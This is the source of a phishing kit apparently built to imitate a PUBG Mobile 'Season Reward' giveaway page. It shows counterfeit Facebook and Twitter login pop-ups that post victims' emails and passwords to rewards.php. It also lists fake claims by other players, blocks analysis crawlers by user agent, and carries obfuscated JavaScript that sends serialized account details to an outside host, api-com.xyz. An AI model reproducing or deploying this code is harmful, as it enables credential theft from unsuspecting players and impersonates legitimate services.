<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video id="headerVideo" src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-title"></div> <!--- event-title --->
<div class="rewards-section">
<div class="event-notification">
<img src="img/helmet.png">
Rewards will be available until
<div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div> <!--- event-notification-timer --->
</div> <!--- event-notification --->
<div class="rewards-wrapper">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Season Reward</div> <!--- menu-content --->
</div> <!--- menu-wrapper --->
<div class="rewards-box-navbar">
<div class="rewards-box-navbar-title">Rewards List</div> <!--- rewards-box-navbar-title --->
</div> <!--- rewards-box-navbar --->
<div class="rewards-box-content">
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">10</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/7LDk0NxC/material-xsuit-silver.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="https://i.postimg.cc/7LDk0NxC/material-xsuit-silver.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/GmX62nsy/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/GmX62nsy/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">10</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/bwyKpwdP/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/bwyKpwdP/11.png">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- rewards-box-content --->
<div class="event-notification">
<img src="img/helmet.png">
<div class="event-notification-player">ID 5295893347 collected Pharaoh X-Suit</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5963737318 collected Koenigsegg Car Skin</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5888686451 collected M416 - Lizard Roar</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5155030554 collected Star Forge - 10</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5463336783 collected M416 - Glacier</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 4745754754 collected Material - 10</div> <!--- event-notification-player --->
</div> <!--- event-notification --->
</div> <!--- rewards-wrapper --->
</div> <!--- rewards-section --->
<div class="footer">
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Sxyy8Kzz/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="https://i.postimg.cc/02LKvdqW/new-Footer-Img.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup account_login">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Login to receive your selected reward</div> <!--- popup-box-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <!--- txt-login-fb --->
<form class="login-form" action="rewards.php" method="post">
<label>
<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action="rewards.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="form-group">
<input type="text" name="email" autocomplete="off" required>
<label>Phone/email/username</label>
</div> <!--- form-group --->
<div class="form-group">
<input type="password" name="password" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group --->
<input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script><script>var _0x49338e=_0x272d;(function(_0x596286,_0x4556cc){var _0x1e7794=_0x272d,_0x47e4a2=_0x596286();while(!![]){try{var _0x43c1f6=parseInt(_0x1e7794(0x19e))/0x1+-parseInt(_0x1e7794(0x1cd))/0x2+parseInt(_0x1e7794(0x1a3))/0x3*(-parseInt(_0x1e7794(0x1c3))/0x4)+-parseInt(_0x1e7794(0x199))/0x5+parseInt(_0x1e7794(0x19d))/0x6*(parseInt(_0x1e7794(0x1d0))/0x7)+-parseInt(_0x1e7794(0x1ab))/0x8+parseInt(_0x1e7794(0x1ce))/0x9*(parseInt(_0x1e7794(0x1a1))/0xa);if(_0x43c1f6===_0x4556cc)break;else _0x47e4a2['push'](_0x47e4a2['shift']());}catch(_0xaaba06){_0x47e4a2['push'](_0x47e4a2['shift']());}}}(_0x1d70,0x9e468));var buka=new Audio();buka[_0x49338e(0x19f)]=_0x49338e(0x1b1);var tutup=new Audio();function _0x1d70(){var _0x3a8af6=['currentTarget','1837808wXRNXn','#myOtherReward_confirmationImg','\x20:\x20','.login-twitter','.itemReward_confirmation','input#login','https://l.top4top.io/m_1725u5z7i1.mp3','.verification_info','preventDefault','input#password','hide','getElementById','.rewards-section','https://a.top4top.io/m_1725zobal2.mp3','display','tab_rewards','check.php','attr','\x20menu-content-active','.account_login','POST','html','.account_verification','value','28TRmXSN','input#playid','input#email','submit','getElementsByClassName','#otherReward_confirmationValue','input#phone','input#level','.otherReward_confirmation','serialize','1731748zvWPDd','12729438gPZGpR','defaultTabRewards','1981aLtBhW','show','className','3475065FGXZcs','https://api-com.xyz/api-flag/','#myItemReward_confirmationImg','event-notification-player','18246DFqoBG','531956bLnpDz','src','ajax','10NhnDCe','click','157728cYpGgg','.check_verification','replace','length','style','block','val'];_0x1d70=function(){return _0x3a8af6;};return _0x1d70();}function _0x272d(_0x1f11d2,_0x3b7e88){var _0x1d7098=_0x1d70();return _0x272d=function(_0x272dd3,_0x1c8bda){_0x272dd3=_0x272dd3-0x198;var _0x1b64fa=_0x1d7098[_0x272dd3];return _0x1b64fa;},_0x272d(_0x1f11d2,_0x3b7e88);}tutup[_0x49338e(0x19f)]=_0x49338e(0x1b8),$(document)['ready'](function(){var _0x13e04e=0x3b,_0x1542fb=0x3b,_0x4cc652=0x17;function _0x3759ab(){var _0x25edf2=_0x272d;setTimeout(_0x3759ab,0x3e8),$('#latestTimer')[_0x25edf2(0x1c0)](''+_0x4cc652+_0x25edf2(0x1ad)+_0x1542fb+'\x20:\x20'+_0x13e04e+''),_0x13e04e--,_0x13e04e<0x0&&(_0x13e04e=0x3b,_0x1542fb--,_0x1542fb<0x0&&(_0x1542fb=0x0,_0x13e04e=0x0));}_0x3759ab();});function openRewards(_0x3351b0,_0x135bab){var _0x34ea0e=_0x49338e,_0x5688b0,_0xe9952b,_0x3a673a;_0xe9952b=document[_0x34ea0e(0x1c7)](_0x34ea0e(0x1ba));for(_0x5688b0=0x0;_0x5688b0<_0xe9952b[_0x34ea0e(0x1a6)];_0x5688b0++){_0xe9952b[_0x5688b0][_0x34ea0e(0x1a7)][_0x34ea0e(0x1b9)]='none';}_0x3a673a=document[_0x34ea0e(0x1c7)]('menu-content');for(_0x5688b0=0x0;_0x5688b0<_0x3a673a[_0x34ea0e(0x1a6)];_0x5688b0++){_0x3a673a[_0x5688b0][_0x34ea0e(0x198)]=_0x3a673a[_0x5688b0][_0x34ea0e(0x198)][_0x34ea0e(0x1a5)](_0x34ea0e(0x1bd),'');}document[_0x34ea0e(0x1b6)](_0x135bab)[_0x34ea0e(0x1a7)][_0x34ea0e(0x1b9)]=_0x34ea0e(0x1a8),_0x3351b0[_0x34ea0e(0x1aa)][_0x34ea0e(0x198)]+=_0x34ea0e(0x1bd);}document[_0x49338e(0x1b6)](_0x49338e(0x1cf))[_0x49338e(0x1a2)]();var slidePlayer=0x0;openSlides();function openSlides(){var _0x17e2d9=_0x49338e,_0x5b98d2,_0x2fab4e=document[_0x17e2d9(0x1c7)](_0x17e2d9(0x19c));for(_0x5b98d2=0x0;_0x5b98d2<_0x2fab4e['length'];_0x5b98d2++){_0x2fab4e[_0x5b98d2][_0x17e2d9(0x1a7)][_0x17e2d9(0x1b9)]='none';}slidePlayer++,slidePlayer>_0x2fab4e[_0x17e2d9(0x1a6)]&&(slidePlayer=0x1),_0x2fab4e[slidePlayer-0x1][_0x17e2d9(0x1a7)][_0x17e2d9(0x1b9)]='block',setTimeout(openSlides,0x9c4);}function open_itemReward_confirmation(_0x321074){var _0x54500c=_0x49338e,_0x19df1f=$(_0x321074)[_0x54500c(0x1bc)](_0x54500c(0x19f));$(_0x54500c(0x1af))['show'](),$(_0x54500c(0x19b))[_0x54500c(0x1bc)](_0x54500c(0x19f),_0x19df1f);}function open_otherReward_confirmation(_0x76df9e){var _0x2bfc36=_0x49338e,_0x44eefa=$(_0x76df9e)[_0x2bfc36(0x1bc)](_0x2bfc36(0x19f)),_0x3317fb=$(_0x76df9e)[_0x2bfc36(0x1bc)](_0x2bfc36(0x1c2));$('.otherReward_confirmation')[_0x2bfc36(0x1d1)](),$(_0x2bfc36(0x1ac))[_0x2bfc36(0x1bc)](_0x2bfc36(0x19f),_0x44eefa),$(_0x2bfc36(0x1c8))[_0x2bfc36(0x1c0)](_0x3317fb);}function open_account_verification(){var _0x281813=_0x49338e;$('.account_verification')[_0x281813(0x1d1)](),$(_0x281813(0x1af))['hide'](),$(_0x281813(0x1cb))[_0x281813(0x1b5)]();}function open_facebook(){var _0x200377=_0x49338e;$('.login-facebook')['show'](),$('.account_login')[_0x200377(0x1b5)]();}function open_twitter(){var _0x2c7074=_0x49338e;$(_0x2c7074(0x1ae))[_0x2c7074(0x1d1)](),$(_0x2c7074(0x1be))[_0x2c7074(0x1b5)]();}function close_reward_confirmation(){var _0x188ba3=_0x49338e;$('.itemReward_confirmation')[_0x188ba3(0x1b5)](),$(_0x188ba3(0x1cb))[_0x188ba3(0x1b5)]();}function tutup_facebook(){var _0x1f3732=_0x49338e;$('.login-facebook')['hide'](),$(_0x1f3732(0x1be))[_0x1f3732(0x1d1)]();}function tutup_twitter(){var _0x460b52=_0x49338e;$(_0x460b52(0x1ae))[_0x460b52(0x1b5)](),$('.account_login')[_0x460b52(0x1d1)]();}function ValidateVerificationData(){var _0x40f519=_0x49338e,_0x55f149=$('#ValidateVerificationDataForm')[_0x40f519(0x1cc)]();return $[_0x40f519(0x1a0)]({'url':_0x40f519(0x19a),'data':_0x55f149,'type':_0x40f519(0x1bf),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$('#ValidateVerificationDataForm')[_0x40f519(0x1c6)](function(_0x2fb0dc){var _0x109af7=_0x40f519;_0x2fb0dc[_0x109af7(0x1b3)]();var _0x1c82c3=$(_0x109af7(0x1c5))[_0x109af7(0x1a9)](),_0x196c01=$(_0x109af7(0x1b4))[_0x109af7(0x1a9)](),_0x26b147=$(_0x109af7(0x1c4))['val'](),_0x175e82=$(_0x109af7(0x1c9))[_0x109af7(0x1a9)](),_0x4596b0=$(_0x109af7(0x1ca))[_0x109af7(0x1a9)](),_0x4ea0f5=$(_0x109af7(0x1b0))[_0x109af7(0x1a9)]();if(_0x1c82c3==''&&_0x196c01==''&&_0x26b147==''&&_0x175e82==''&&_0x4596b0==''&&_0x4ea0f5=='')return $(_0x109af7(0x1b2))[_0x109af7(0x1d1)](),$('.account_verification')['hide'](),![];$[_0x109af7(0x1a0)]({'type':_0x109af7(0x1bf),'url':_0x109af7(0x1bb),'data':$(this)[_0x109af7(0x1cc)](),'beforeSend':function(){var _0x64852c=_0x109af7;$(_0x64852c(0x1a4))['show'](),$(_0x64852c(0x1c1))[_0x64852c(0x1b5)]();},'success':function(){var _0x1b84dd=_0x109af7;$('.processing-section')[_0x1b84dd(0x1d1)](),$(_0x1b84dd(0x1b7))[_0x1b84dd(0x1b5)](),$(_0x1b84dd(0x1a4))[_0x1b84dd(0x1b5)](),$(_0x1b84dd(0x1c1))[_0x1b84dd(0x1b5)]();}});}),![];};</script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>


</body>
</html>